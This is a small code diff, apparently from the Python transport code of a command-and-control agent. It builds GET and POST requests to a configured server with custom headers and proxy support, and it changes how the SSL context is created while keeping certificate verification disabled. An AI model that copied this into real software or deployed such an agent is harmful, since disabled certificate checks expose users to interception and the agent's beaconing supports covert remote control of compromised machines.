@@ -153,8 +153,7 @@ CRYPTO_HERE
             hdrs[header["name"]] = header["value"]
         req = urllib2.Request(self.agent_config["Server"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
 
-        # To avoid HTTPS cert verification
-        gcontext = ssl.SSLContext()
+        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS)
         gcontext.verify_mode = ssl.CERT_NONE
 
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
@@ -186,8 +185,7 @@ CRYPTO_HERE
             hdrs[header["name"]] = header["value"]
         req = urllib2.Request(self.agent_config["Server"] + self.agent_config["PostURI"], data, hdrs)
 
-        # To avoid HTTPS cert verification
-        gcontext = ssl.SSLContext()
+        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS)
         gcontext.verify_mode = ssl.CERT_NONE
 
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
